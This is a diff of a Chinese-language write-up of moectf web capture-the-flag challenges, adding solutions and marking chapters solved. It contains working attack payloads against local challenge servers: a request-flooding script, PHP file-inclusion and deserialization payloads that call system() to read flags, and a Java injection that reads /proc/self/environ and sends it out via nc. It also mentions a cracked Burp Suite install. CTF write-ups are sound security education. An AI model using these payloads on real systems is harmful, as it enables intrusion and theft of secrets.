@@ -6,7 +6,7 @@
 
 </div>
 
-## 0 Web 入门指北
+## 0 Web 入门指北 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{jv@vScr1p7_14_so0o0o0o_inT3r3&t!!!}`
@@ -17,7 +17,7 @@
 
 也可以使用 [de4js](https://lelinhtinh.github.io/de4js/) 等反混淆器得到答案。
 
-## 01 第一章 神秘的手镯
+## 01 第一章 神秘的手镯 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{f_i2_1s_Your_g00d_fri3nd!!}`
@@ -44,7 +44,80 @@ function validatePassword() {
 
 这里即可得到 `flag` 内容。我们也有另一种绕过粘贴检测的方式：直接用 `notepad` 打开对应文件后，全选并拖入输入框中。
 
-## 02 第二章 初识金曦玄轨
+## 01 第一章 神秘的手镯_revenge ✅
+
+> [!NOTE]
+> 星澜音忘记 `flag` 了。
+<!---->
+> K 皇：咳咳…其实当年飞升后，为了防止你偷偷看我收藏的小秘密，我重新设置了一个密码放在 `wanyanzhou.txt` 里面了……但是我忘记密码是啥了，而且不小心把保存密码的文件删了……
+
+极为诡异的题目，如同脑筋急转弯一般，我们需要注意到 `wanyanzhou.txt` 的内容位于 `127.0.0.1:port/wanyanzhou.txt.bak` 中……然后写个 Python 脚本连发 500 次即可。下面给出一个可用的脚本：
+
+```python
+import json
+import os
+
+import requests
+
+
+def send_unseal_requests():
+    # 读取 wanyanzhou.bak 文件内容
+    try:
+        with open("wanyanzhou.bak", "r", encoding="utf-8") as file:
+            file_content = file.read()
+    except FileNotFoundError:
+        print("错误：找不到 wanyanzhou.bak 文件")
+        return
+    except Exception as e:
+        print(f"读取文件时出错：{e}")
+        return
+
+    # 构造请求数据
+    payload = {"content": file_content}
+
+    # 设置请求头
+    headers = {"X-Special-Header": "magic", "Content-Type": "application/json"}
+
+    # 目标 URL
+    url = "http://127.0.0.1:5045/unseal"
+
+    # 发送 500 个请求
+    success_count = 0
+    fail_count = 0
+
+    for i in range(500):
+        try:
+            response = requests.post(url, json=payload, headers=headers, timeout=10)
+
+            if response.status_code == 200:
+                success_count += 1
+                print(f"请求 {i+1}/500 成功 - 状态码: {response.status_code}")
+            else:
+                fail_count += 1
+                print(f"请求 {i+1}/500 失败 - 状态码: {response.status_code}")
+
+        except requests.exceptions.RequestException as e:
+            fail_count += 1
+            print(f"请求 {i+1}/500 异常 - {e}")
+
+    # 输出统计信息
+    print(f"\n=== 请求完成 ===")
+    print(f"成功: {success_count}")
+    print(f"失败: {fail_count}")
+    print(f"成功率: {success_count/5}%")
+
+
+if __name__ == "__main__":
+    # 检查文件是否存在
+    if not os.path.exists("wanyanzhou.bak"):
+        print("错误：wanyanzhou.bak 文件不存在")
+    else:
+        send_unseal_requests()
+```
+
+这里不得不吐槽一下 Burp Suite Community 了😡免费版不能把用户不当人啊，我挂了一个小时 Intruder，环境的一个小时时限都完了，500 次包还没发完😄
+
+## 02 第二章 初识金曦玄轨 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{0bs3rv3_Th3_Gold3n_traiL}`
@@ -55,7 +128,7 @@ function validatePassword() {
 
 ![在 HTTP GET 请求响应标头中得到 `flag`](./get_flag_from_response_header.png)
 
-## 03 第三章 问剑石！篡天改命！<!---->
+## 03 第三章 问剑石！篡天改命！✅ <!---->
 
 > [!NOTE]
 > **FLAG:** `moectf{Get-P0sT_TR4NsmISSion_I5_a_GOOD_METhoD??????}`，后面可能是随机的。
@@ -98,7 +171,7 @@ Connection: keep-alive
 
 ![修改 HTTP POST 请求体](./edit_http_post_request_body.png)
 
-## 04 第四章 金曦破禁与七绝傀儡阵
+## 04 第四章 金曦破禁与七绝傀儡阵 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}`
@@ -274,7 +347,7 @@ curl -X PUT "http://127.0.0.1:3604/void_rebirth" -d "新生！"
 
 使用 Base64 解码 7 个玉简碎片拼接后的字符串即可。
 
-## 05 第五章 打上门来！<!---->
+## 05 第五章 打上门来！✅ <!---->
 
 > [!NOTE]
 > **FLAG:** `moectf{Al1_1NPUT-lS-MAI1Ci0U5????????}`，后面可能是随机的。
@@ -287,7 +360,7 @@ curl -X PUT "http://127.0.0.1:3604/void_rebirth" -d "新生！"
 
 ![访问父目录以得到 `flag` 文件](./get_flag_in_parent_directory.png)
 
-## 06 第六章 藏经禁制？玄机初探！<!---->
+## 06 第六章 藏经禁制？玄机初探！✅ <!---->
 
 > [!NOTE]
 > **FLAG:** `moectf{WE1CoMe-to-SQ1_lnjecTiON!!???????}`，后面可能是随机的。
@@ -296,7 +369,7 @@ curl -X PUT "http://127.0.0.1:3604/void_rebirth" -d "新生！"
 
 ![进行基本的 SQL 注入](./basic_sql_injection.png)
 
-## 07 第七章 灵蛛探穴与阴阳双生符
+## 07 第七章 灵蛛探穴与阴阳双生符 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{Md5_lS_NOT-sAF3????????????}`，后面可能是随机的。
@@ -345,7 +418,7 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 
 访问 `http://127.0.0.1:6218/flag.php?a=314282422&b=240610708` 即可得到 `flag`。
 
-## 08 第八章 天衍真言，星图显圣
+## 08 第八章 天衍真言，星图显圣 ✅
 
 > [!NOTE]
 > 「和上次一样的界面，那我再登录一次就行了……吗？」
@@ -397,7 +470,9 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 
 ![从 `flag` 表的 `value` 列得到 `flag`](./get_flag_in_value_column_in_flag.png)
 
-## 09 第九章 星墟禁制·天机问路
+顺带一提，这个题用 `sqlmap` 似乎可以直接爆出 `flag`，但是星澜音做完这道题之前还不知道有这么个工具😡😡😡
+
+## 09 第九章 星墟禁制·天机问路 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -417,7 +492,7 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 
 ![构造多指令来寻找 `flag`](./find_flag_using_multiple_commands.png)
 
-## 10 第十章 天机符阵
+## 10 第十章 天机符阵 ✅
 
 > [!NOTE]
 > **FLAG:** `moectf{G00d_7o6_4nD_XX3_Unl0ck_St4r_S34l}`，后面可能是随机的。
@@ -432,7 +507,7 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 
 经过出题人证实，这是一种非预期做法，并且在「10 第十章 天机符阵_revenge」中进行了修正。
 
-## 10 第十章 天机符阵_revenge
+## 10 第十章 天机符阵_revenge ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -473,7 +548,7 @@ PHP 存在这样的特性，若一个字符串以 `0e` 开头，则它会被解�
 
 ![使用 XXE 攻击获得 `flag`](./get_flag_via_xxe_attack.png)
 
-## 11 第十一章 千机变·破妄之眼
+## 11 第十一章 千机变·破妄之眼 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -586,7 +661,7 @@ echo "flag就在这了，看不到吗，是老弟境界不够吧";
 
 果然是给我塞了一段 PHP 文件😡😡，好在这道题目成功解决了！ヾ(≧▽≦\*)o
 
-## 12 第十二章 玉魄玄关·破妄
+## 12 第十二章 玉魄玄关·破妄 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -605,7 +680,7 @@ highlight_file(__FILE__);
 
 ![在中国蚁剑中获得环境变量](./get_env_in_antsword.png)
 
-## 13 第十三章 通幽关·灵纹诡影
+## 13 第十三章 通幽关·灵纹诡影 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -629,7 +704,7 @@ system('printenv');
 
 ![修改文件头以上传 PHP 文件](./modify_header_to_upload_php.png)
 
-## 14 第十四章 御神关·补天玉碑
+## 14 第十四章 御神关·补天玉碑 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -658,7 +733,14 @@ system('printenv');
 
 这显然是 `.htaccess` 的内容。一个 `.htaccess` 文件可以改变对某种扩展名的解释方法，在这里，我们可以在 `.htaccess` 中设置 Apache 将所有 `.txt` 以 PHP 代码的方式解析，随后将 `lingwen.php` 改名为 `lingwen.txt` 上传并访问即可。
 
-## 16 第十六章 昆仑星途
+## 15 第十五章 归真关·竞时净魔 ✅
+
+> [!NOTE]
+> 星澜音又忘了 `flag` 了。
+
+是一个诡异的条件竞争。使用 Intruder 连发 `exploit.php`，用 Python 脚本尝试在清除前解析即可。本题过于吃运气，星澜音开了 30 分钟才成功一次。这里感谢 Patricia Of End 先生倾情提供的 Burp Suite Professional 安装服务😭（不知道为啥星澜音死活不会用注册机）
+
+## 16 第十六章 昆仑星途 ✅
 
 > [!NOTE]
 > 我们总说人一定要学会坚持，但方向也是不容忽略的、至关重要的因素……
@@ -702,7 +784,7 @@ apache2-foreground
 ?>
 ```
 
-找了一位可靠的朋友挂到了他的服务器上，访问！
+挂到一位朋友的服务器上，访问！
 
 ![尝试使用 RFI 攻击](./try_RFI_attack.png)
 
@@ -762,7 +844,7 @@ http://127.0.0.1:9194/?file=data:text/plain,<?php system('cat /flag-VJhlPvt82dhb
 >
 > 虽说人生暂时没有方向，但好在星澜音还有一位[「心之所向」](https://github.com/DryIce-cc)。❤️好开心w 明天就是七夕节了，星澜音一定要和自己的心之所向永远在一起 (●'◡'●)
 
-## 17 第十七章 星骸迷阵·神念重构
+## 17 第十七章 星骸迷阵·神念重构 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -812,7 +894,7 @@ O%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%2
 
 ![由反序列化得到 `flag`](./get_flag_using_unserialization.png)
 
-## 18 第十八章 万卷诡阁·功法连环
+## 18 第十八章 万卷诡阁·功法连环 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -888,7 +970,7 @@ O%3A7%3A%22PersonA%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonB%22%3A1%3A
 
 访问以得到 `flag`。这与 17 题的逻辑大体吻合，这里就不放截图了。
 
-## 19 第十九章 星穹真相·补天归源
+## 19 第十九章 星穹真相·补天归源 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -1010,7 +1092,7 @@ Fatal error: Uncaught Error: Attempt to assign property "age" on null in /app/in
 
 但是 0 个人在意了，我们已经拿到 `flag` 了！耶耶耶——
 
-## 19 第十九章_revenge
+## 19 第十九章_revenge ✅
 
 > 空间裂缝闭合的刹那，三人坠入一片混沌星穹。这里没有天地之分，只有无数破碎的镜面悬浮流转，每一面镜子都映照出不同的时空片段——有玄天剑宗的庆功宴，有葬星古墟的惨战，甚至还有 HDdss 幼时在赵家偏院练剑的青涩模样。
 >
@@ -1148,7 +1230,7 @@ O%3A7%3A%22PersonA%22%3A3%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonC%22%3A3%3A
 
 成功拿下😎
 
-## 20 第二十章 幽冥血海·幻语心魔
+## 20 第二十章 幽冥血海·幻语心魔 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -1177,7 +1259,7 @@ O%3A7%3A%22PersonA%22%3A3%3A%7Bs%3A4%3A%22name%22%3BO%3A7%3A%22PersonC%22%3A3%3A
 
 好耶！
 
-## 21 第二十一章 往生漩涡·言灵死局
+## 21 第二十一章 往生漩涡·言灵死局 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -1298,7 +1380,7 @@ len(''.__class__.__mro__[1].__subclasses__())
 
 没错。这一段是显然的，我们就不解析了。
 
-## 22 第二十二章 血海核心·千年手段
+## 22 第二十二章 血海核心·千年手段 ✅
 
 > [!NOTE]
 > 绝世神题，一天时间内逼疯零音和 Gemini 的题目，好在给出了一个虽然不太漂亮的解答。
@@ -1536,9 +1618,15 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 </div>
 
-## WebShell
+> [!TIP]
+>
+> fifker 后来告诉星澜音，`rev` 的源代码就在同目录的 `rev.c` 里😄哎……不过 IDA Pro 本身没占多大事就是了。能做出来就是好事么😋
 
-## WebShell_revenge
+## WebShell ✅
+
+（咋构造来着🤔我忘了，好像是对 payload 做了个异或运算还是啥……晕。先把 writeup 交了吧，这个题的 writeup 赛后补。）
+
+## WebShell_revenge ✅
 
 > [!NOTE]
 > 本题的 `flag` 是随机的。
@@ -1598,7 +1686,9 @@ cat /flag
 . /???/????????[@-[]
 ```
 
-## 23 第二十三章 幻境迷心·皇陨星沉（大结局）
+（这个以后补，反正就是通配符可以通配到我们传上去那个文件，然后运行就行。星澜音困很，想睡了）
+
+## 23 第二十三章 幻境迷心·皇陨星沉（大结局）✅
 
 <div align="center">
 
@@ -1932,7 +2022,34 @@ HashMap<Object, Object> internalMap = new HashMap<>();
 
 对了，跑之前记得装一下 OpenJDK 8，因为注意到新版 JDK 对部分安全相关的功能进行了限制。总之，两个环境一个开 `nc` 监听，一个用 `nc` 发包就可以了😋至于输出，零音在这里就不放了。
 
-## Moe 笑传之猜猜爆
+## 附加挑战 ✅
+
+哈喽又是我，10 月 8 日补 writeup 的星澜音。有人可能会问为啥你不过几天再写？这么说吧，星澜音的国庆假高数作业完成度 10%😭想了想还是先把 writeup 写了吧。
+
+其实不难，第二十三章看懂了这个就是显然的。我们直接给出 payload，用它来替换上面的 payload 中对应部分即可。
+
+```java
+String evilCode = "{\n"
+        + "  try {\n"
+        + "    String cmd = \"flag=$(awk '{printf \\\"%s\\\",$0}' /proc/self/environ); \";\n"
+        + "    cmd += \"if command -v base64 >/dev/null 2>&1; then enc=$(printf \\\"%s\\\" \\\"$flag\\\" | base64 -w0 2>/dev/null || printf \\\"%s\\\" \\\"$flag\\\" | base64); else enc=$(printf \\\"%s\\\" \\\"$flag\\\"); fi; \";\n"
+        + "    // Escape + / = from base64 so form parsing won't mangle it\n"
+        + "    cmd += \"enc2=$(printf '%s' \\\"$enc\\\" | sed -e 's/+/%2B/g' -e 's:/:%2F:g' -e 's/=/%3D/g'); \";\n"
+        + "    cmd += \"data=\\\"name=$enc2&breed=pwn&age=1\\\"; \";\n"
+        + "    cmd += \"len=$(printf '%s' \\\"$data\\\" | wc -c); \";\n"
+        + "    cmd += \"printf 'POST /dogs HTTP/1.1\\\\r\\\\nHost: 127.0.0.1\\\\r\\\\nContent-Type: application/x-www-form-urlencoded\\\\r\\\\nContent-Length: %d\\\\r\\\\n\\\\r\\\\n%s' $len \\\"$data\\\" | nc 127.0.0.1 8080\";\n"
+        + "    java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",cmd});\n"
+        + "  } catch (Exception e) { }\n"
+        + "}";
+```
+
+因为这个 Spring Boot 程序会响应对 `/dogs` 的 HTTP POST 请求，并将其解读为添加狗狗的操作，所以我们套一个双层炸弹，让特工狗先注入进去，就像第二十三章那样，不过不让它把东西给反弹机，而是让它再造一个狗狗出来。
+
+刚开始星澜音用了 `curl`，但是死活不行，突然一想，会不会远程环境没有 `curl`？🤔这下说得通了😄但是根据第二十三章的经验，`nc` 应该是有的吧，那就手动构造 HTTP POST 请求好了。
+
+这段 payload 是雾雨（GPT-5）写的，反正我写不出来😭雾雨做了一堆鲁棒性优化，不过我寻思其实普通的指令应该就能行，大不了注入不了再改，问题不大。不过雾雨还是聪明的😋雾雨大善人😭
+
+## Moe 笑传之猜猜爆 ✅
 
 > [!NOTE]
 > 该题目的 `flag` 是随机的。
@@ -1961,7 +2078,7 @@ let randomNumber = Math.floor(Math.random()*10000) + 1; // 1-10000
 
 我们可以直接向 `/flag` 发送 HTTP POST 请求以得到 `flag`。这里星澜音不再赘述。
 
-## 摸金偶遇 FLAG，拼尽全力难战胜
+## 摸金偶遇 FLAG，拼尽全力难战胜 ✅
 
 > [!NOTE]
 > 玩这个什么游戏导致的。
